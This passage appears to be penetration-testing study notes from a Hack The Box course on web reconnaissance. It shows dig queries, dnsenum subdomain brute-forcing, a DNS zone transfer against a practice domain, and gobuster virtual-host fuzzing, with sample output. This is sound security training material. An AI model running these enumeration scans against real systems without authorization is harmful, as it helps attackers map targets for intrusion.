  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mapping the Network Infrastructure&lt;/code&gt;: You can create a comprehensive map of the target’s network infrastructure by analysing DNS data. For example, identifying the name servers (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NS&lt;/code&gt; records) for a domain can reveal the hosting provider used, while an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A&lt;/code&gt; record for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loadbalancer.example.com&lt;/code&gt; can pinpoint a load balancer. This helps you understand how different systems are connected, identify traffic flow, and pinpoint potential choke points or weaknesses that could be exploited during a penetration test.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Monitoring for Changes&lt;/code&gt;: Continuously monitoring DNS records can reveal changes in the target’s infrastructure over time. For example, the sudden appearance of a new subdomain (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vpn.example.com&lt;/code&gt;) might indicate a new entry point into the network, while a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TXT&lt;/code&gt; record containing a value like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_1password=...&lt;/code&gt; strongly suggests the organization is using 1Password, which could be leveraged for social engineering attacks or targeted phishing campaigns.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;the-domain-information-groper&quot;&gt;The Domain Information Groper&lt;/h2&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig&lt;/code&gt; command (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Domain Information Groper&lt;/code&gt;) is a versatile and powerful utility for querying DNS servers and retrieving various types of DNS records. Its flexibility and detailed and customizable output make it a go-to choice.&lt;/p&gt;

&lt;h3 id=&quot;common-dig-commands&quot;&gt;Common dig Commands&lt;/h3&gt;

&lt;p&gt;| Command                         | Description                                                                                                                                                                                          |
| ——————————- | —————————————————————————————————————————————————————————————————- |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig domain.com&lt;/code&gt;                | Performs a default A record lookup for the domain.                                                                                                                                                   |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig domain.com A&lt;/code&gt;              | Retrieves the IPv4 address (A record) associated with the domain.                                                                                                                                    |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig domain.com AAAA&lt;/code&gt;           | Retrieves the IPv6 address (AAAA record) associated with the domain.                                                                                                                                 |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig domain.com MX&lt;/code&gt;             | Finds the mail servers (MX records) responsible for the domain.                                                                                                                                      |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig domain.com NS&lt;/code&gt;             | Identifies the authoritative name servers for the domain.                                                                                                                                            |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig domain.com TXT&lt;/code&gt;            | Retrieves any TXT records associated with the domain.                                                                                                                                                |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig domain.com CNAME&lt;/code&gt;          | Retrieves the canonical name (CNAME) record for the domain.                                                                                                                                          |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig domain.com SOA&lt;/code&gt;            | Retrieves the start of authority (SOA) record for the domain.                                                                                                                                        |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig @1.1.1.1 domain.com&lt;/code&gt;       | Specifies a specific name server to query; in this case 1.1.1.1                                                                                                                                      |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig +trace domain.com&lt;/code&gt;         | Shows the full path of DNS resolution.                                                                                                                                                               |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig -x 192.168.1.1&lt;/code&gt;            | Performs a reverse lookup on the IP address 192.168.1.1 to find the associated host name. You may need to specify a name server.                                                                     |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig +short domain.com&lt;/code&gt;         | Provides a short, concise answer to the query.                                                                                                                                                       |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig +noall +answer domain.com&lt;/code&gt; | Displays only the answer section of the query output.                                                                                                                                                |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig domain.com ANY&lt;/code&gt;            | Retrieves all available DNS records for the domain (Note: Many DNS servers ignore &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANY&lt;/code&gt; queries to reduce load and prevent abuse, as per &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc8482&quot;&gt;RFC 8482&lt;/a&gt;). |&lt;/p&gt;
&lt;h1 id=&quot;subdomain-bruteforcing&quot;&gt;Subdomain Bruteforcing&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Subdomain Brute-Force Enumeration&lt;/code&gt; is a powerful active subdomain discovery technique that leverages pre-defined lists of potential subdomain names. This approach systematically tests these names against the target domain to identify valid subdomains. By using carefully crafted wordlists, you can significantly increase the efficiency and effectiveness of your subdomain discovery efforts.&lt;/p&gt;

&lt;p&gt;The process breaks down into four steps:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wordlist Selection&lt;/code&gt;: The process begins with selecting a wordlist containing potential subdomain names. These wordlists can be:
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;General-Purpose&lt;/code&gt;: Containing a broad range of common subdomain names (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dev&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;staging&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blog&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mail&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;). This approach is useful when you don’t know the target’s naming conventions.&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Targeted&lt;/code&gt;: Focused on specific industries, technologies, or naming patterns relevant to the target. This approach is more efficient and reduces the chances of false positives.&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Custom&lt;/code&gt;: You can create your own wordlist based on specific keywords, patterns, or intelligence gathered from other sources.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Iteration and Querying&lt;/code&gt;: A script or tool iterates through the wordlist, appending each word or phrase to the main domain (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.com&lt;/code&gt;) to create potential subdomain names (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dev.example.com&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;staging.example.com&lt;/code&gt;).&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS Lookup&lt;/code&gt;: A DNS query is performed for each potential subdomain to check if it resolves to an IP address. This is typically done using the A or AAAA record type.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Filtering and Validation&lt;/code&gt;: If a subdomain resolves successfully, it’s added to a list of valid subdomains. Further validation steps might be taken to confirm the subdomain’s existence and functionality (e.g., by attempting to access it through a web browser).Code: bash&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dnsenum &lt;span class=&quot;nt&quot;&gt;--enum&lt;/span&gt; inlanefreight.com &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dnsenum &lt;span class=&quot;nt&quot;&gt;--enum&lt;/span&gt; inlanefreight.com &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt 

dnsenum VERSION:1.2.6

&lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;   inlanefreight.com   &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;


Host&lt;span class=&quot;s1&quot;&gt;&apos;s addresses:
__________________

inlanefreight.com.                       300      IN    A        134.209.24.248

[...]

Brute forcing with /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:
_______________________________________________________________________________________

www.inlanefreight.com.                   300      IN    A        134.209.24.248
support.inlanefreight.com.               300      IN    A        134.209.24.248
[...]


done.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;dns-zone-transfers&quot;&gt;DNS Zone Transfers&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;While brute-forcing can be a fruitful approach, there’s a less invasive and potentially more efficient method for uncovering subdomains – DNS zone transfers. This mechanism, designed for replicating DNS records between name servers, can inadvertently become a goldmine of information for prying eyes if misconfigured.&lt;/p&gt;

&lt;h2 id=&quot;what-is-a-zone-transfer&quot;&gt;What is a Zone Transfer&lt;/h2&gt;

&lt;p&gt;A DNS zone transfer is essentially a wholesale copy of all DNS records within a zone (a domain and its subdomains) from one name server to another. This process is essential for maintaining consistency and redundancy across DNS servers. However, if not adequately secured, unauthorised parties can download the entire zone file, revealing a complete list of subdomains, their associated IP addresses, and other sensitive DNS data.![[dns_axfr.png]]&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Zone Transfer Request (AXFR)&lt;/code&gt;: The secondary DNS server initiates the process by sending a zone transfer request to the primary server. This request typically uses the AXFR (Full Zone Transfer) type.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOA Record Transfer&lt;/code&gt;: Upon receiving the request (and potentially authenticating the secondary server), the primary server responds by sending its Start of Authority (SOA) record. The SOA record contains vital information about the zone, including its serial number, which helps the secondary server determine if its zone data is current.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS Records Transmission&lt;/code&gt;: The primary server then transfers all the DNS records in the zone to the secondary server, one by one. This includes records like A, AAAA, MX, CNAME, NS, and others that define the domain’s subdomains, mail servers, name servers, and other configurations.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Zone Transfer Complete&lt;/code&gt;: Once all records have been transmitted, the primary server signals the end of the zone transfer. This notification informs the secondary server that it has received a complete copy of the zone data.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Acknowledgement (ACK)&lt;/code&gt;: The secondary server sends an acknowledgement message to the primary server, confirming the successful receipt and processing of the zone data. This completes the zone transfer process.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The information gleaned from an unauthorised zone transfer can be invaluable to an attacker. It reveals a comprehensive map of the target’s DNS infrastructure, including:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Subdomains&lt;/code&gt;: A complete list of subdomains, many of which might not be linked from the main website or easily discoverable through other means. These hidden subdomains could host development servers, staging environments, administrative panels, or other sensitive resources.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IP Addresses&lt;/code&gt;: The IP addresses associated with each subdomain, providing potential targets for further reconnaissance or attacks.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Name Server Records&lt;/code&gt;: Details about the authoritative name servers for the domain, revealing the hosting provider and potential misconfigurations.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;exploiting-zone-transfers&quot;&gt;Exploiting Zone Transfers&lt;/h4&gt;

&lt;p&gt;You can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dig&lt;/code&gt; command to request a zone transfer:&lt;/p&gt;

&lt;p&gt;DNS Zone Transfers&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig axfr @nsztm1.digi.ninja zonetransfer.me
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig axfr @nsztm1.digi.ninja zonetransfer.me

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; DiG 9.18.12-1~bpo11+1-Debian &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; axfr @nsztm1.digi.ninja zonetransfer.me
&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 server found&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; global options: +cmd
zonetransfer.me.  7200  IN  SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 1209600 3600
zonetransfer.me.  300 IN  HINFO &lt;span class=&quot;s2&quot;&gt;&quot;Casio fx-700G&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Windows XP&quot;&lt;/span&gt;
zonetransfer.me.  301 IN  TXT &lt;span class=&quot;s2&quot;&gt;&quot;google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA&quot;&lt;/span&gt;
zonetransfer.me.  7200  IN  MX  0 ASPMX.L.GOOGLE.COM.
...
zonetransfer.me.  7200  IN  A 5.196.105.14
zonetransfer.me.  7200  IN  NS  nsztm1.digi.ninja.
zonetransfer.me.  7200  IN  NS  nsztm2.digi.ninja.
_acme-challenge.zonetransfer.me. 301 IN TXT &lt;span class=&quot;s2&quot;&gt;&quot;6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI&quot;&lt;/span&gt;
_sip._tcp.zonetransfer.me. 14000 IN SRV 0 0 5060 www.zonetransfer.me.
14.105.196.5.IN-ADDR.ARPA.zonetransfer.me. 7200 IN PTR www.zonetransfer.me.
asfdbauthdns.zonetransfer.me. 7900 IN AFSDB 1 asfdbbox.zonetransfer.me.
asfdbbox.zonetransfer.me. 7200  IN  A 127.0.0.1
asfdbvolume.zonetransfer.me. 7800 IN  AFSDB 1 asfdbbox.zonetransfer.me.
canberra-office.zonetransfer.me. 7200 IN A  202.14.81.230
...
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; Query &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 10 msec
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; SERVER: 81.4.108.41#53&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nsztm1.digi.ninja&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; WHEN: Mon May 27 18:31:35 BST 2024
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; XFR size: 50 records &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;messages 1, bytes 2085&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;virtual-hosts&quot;&gt;Virtual Hosts&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;Once the DNS directs traffic to the correct server, the web server configuration becomes crucial in determining how the incoming requests are handled. Web servers like Apache, Nginx, or IIS are designed to host multiple websites or applications on a single server. They achieve this through virtual hosting, which allows them to differentiate between domains, subdomains, or even separate websites with distinct content.&lt;/p&gt;

&lt;h2 id=&quot;understanding-vhosts-and-subdomains&quot;&gt;Understanding VHosts and Subdomains&lt;/h2&gt;

&lt;p&gt;At the core of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;virtual hosting&lt;/code&gt; is the ability of web servers to distinguish between multiple websites or applications sharing the same IP address. This is achieved by leveraging the &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP Host&lt;/code&gt; header&lt;/strong&gt;, a piece of information included in every &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; request sent by a web browser.&lt;/p&gt;

&lt;p&gt;The key difference between &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VHosts&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subdomains&lt;/code&gt; is their relationship to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Domain Name System (DNS)&lt;/code&gt; and the web server’s configuration.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Subdomains&lt;/code&gt;&lt;/strong&gt;: These are extensions of a main domain name (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;blog.example.com&lt;/code&gt; is a subdomain of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.com&lt;/code&gt;). &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Subdomains&lt;/code&gt; typically have their own &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS records&lt;/code&gt;, pointing to either the same IP address as the main domain or a different one. They can be used to organise different sections or services of a website.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Virtual Hosts&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VHosts&lt;/code&gt;)&lt;/strong&gt;: Virtual hosts are configurations within a web server that allow multiple websites or applications to be hosted on a single server. They can be associated with top-level domains (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.com&lt;/code&gt;) or subdomains (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dev.example.com&lt;/code&gt;). Each virtual host can have its own separate configuration, enabling precise control over how requests are handled.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;example apache.conf&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apacheconf
# Example of name-based virtual host configuration in Apache
&amp;lt;VirtualHost *:80&amp;gt;
    ServerName www.example1.com
    DocumentRoot /var/www/example1
&amp;lt;/VirtualHost&amp;gt;

&amp;lt;VirtualHost *:80&amp;gt;
    ServerName www.example2.org
    DocumentRoot /var/www/example2
&amp;lt;/VirtualHost&amp;gt;

&amp;lt;VirtualHost *:80&amp;gt;
    ServerName www.another-example.net
    DocumentRoot /var/www/another-example
&amp;lt;/VirtualHost&amp;gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;server-vhost-lookup&quot;&gt;Server VHost Lookup&lt;/h3&gt;

&lt;p&gt;The following illustrates the process of how a web server determines the correct content to serve based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host&lt;/code&gt; header:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://mermaid.ink/svg/pako:eNqNUsFuwjAM_ZUop00CPqAHDhubuCBNBW2XXrzUtNFap3McOoT496WUVUA3aTkltp_f84sP2rgcdaI9fgYkgwsLBUOdkYqnARZrbAMk6oFd65HHiTd8XyPvfku9WpYA1dJ5eXS0tcW4ZOFMqJEkdU4y6vNnqul8PvRO1HKzeVFpp9KLumvbdmapAsItoy1KmRlX3_fwAXTd4OkLakuoOjVqiZAj_7_PaJJEPVvK1QrElJYK1UcDg1h3HmOEmV4LSlEC0-CA6i24Zb406IRhizuM7BV6BVFCit4FNuh77GX9DeGfmEu-s_mD4b5x5PH2Y4aqhfVNBftufomsGemJrpFrsHncqkOHy7SUWGOmk3jNgT8yndEx1kEQt96T0YlwwIlmF4pSJ1uofHyFJgf52cchirkVx6t-aU-7e_wG--_4bQ&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Browser Requests a Website&lt;/code&gt;: When you enter a domain name (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.inlanefreight.com&lt;/code&gt;) into your browser, it initiates an HTTP request to the web server associated with that domain’s IP address.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host Header Reveals the Domain&lt;/code&gt;: The browser includes the domain name in the request’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host&lt;/code&gt; header, which acts as a label to inform the web server which website is being requested.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Web Server Determines the Virtual Host&lt;/code&gt;: The web server receives the request, examines the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host&lt;/code&gt; header, and consults its virtual host configuration to find a matching entry for the requested domain name.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Serving the Right Content&lt;/code&gt;: Upon identifying the correct virtual host configuration, the web server retrieves the corresponding files and resources associated with that website from its document root and sends them back to the browser as the HTTP response.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In essence, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host&lt;/code&gt; header functions as a switch, enabling the web server to dynamically determine which website to serve based on the domain name requested by the browser.&lt;/p&gt;

&lt;h2 id=&quot;virtual-host-discovery-tools&quot;&gt;Virtual Host Discovery Tools&lt;/h2&gt;

&lt;p&gt;While manual analysis of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP headers&lt;/code&gt; and reverse &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS lookups&lt;/code&gt; can be effective, specialised &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;virtual host discovery tools&lt;/code&gt; automate and streamline the process, making it more efficient and comprehensive. These tools employ various techniques to probe the target server and uncover potential &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;virtual hosts&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Several tools are available to aid in the discovery of virtual hosts:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Tool&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
      &lt;th&gt;Features&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;https://github.com/OJ/gobuster&quot;&gt;gobuster&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;A multi-purpose tool often used for directory/file brute-forcing, but also effective for virtual host discovery.&lt;/td&gt;
      &lt;td&gt;Fast, supports multiple HTTP methods, can use custom wordlists.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;https://github.com/epi052/feroxbuster&quot;&gt;Feroxbuster&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Similar to Gobuster, but with a Rust-based implementation, known for its speed and flexibility.&lt;/td&gt;
      &lt;td&gt;Supports recursion, wildcard discovery, and various filters.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;https://github.com/ffuf/ffuf&quot;&gt;ffuf&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Another fast web fuzzer that can be used for virtual host discovery by fuzzing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Host&lt;/code&gt; header.&lt;/td&gt;
      &lt;td&gt;Customizable wordlist input and filtering options.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; command to bruteforce vhosts generally looks like this:&lt;/p&gt;

&lt;p&gt;Virtual Hosts&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster vhost &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://&amp;lt;target_IP_address&amp;gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &amp;lt;wordlist_file&amp;gt; &lt;span class=&quot;nt&quot;&gt;--append-domain&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-u&lt;/code&gt; flag specifies the target URL (replace &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;target_IP_address&amp;gt;&lt;/code&gt; with the actual IP).&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-w&lt;/code&gt; flag specifies the wordlist file (replace &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;wordlist_file&amp;gt;&lt;/code&gt; with the path to your wordlist).&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--append-domain&lt;/code&gt; flag appends the base domain to each word in the wordlist.&lt;/p&gt;

    &lt;p&gt;In newer versions of Gobuster, the –append-domain flag is required to append the base domain to each word in the wordlist when performing virtual host discovery.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;#fuzzing #subdomain #gobuster&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster vhost &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://inlanefreight.htb:81 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt &lt;span class=&quot;nt&quot;&gt;--append-domain&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Gobuster v3.6
by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:             http://inlanefreight.htb:81
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:          GET
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:         10
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:      gobuster/3.6
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:         10s
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Append Domain:   &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;VHOST enumeration mode
&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
Found: forum.inlanefreight.htb:81 Status: 200 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 100]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
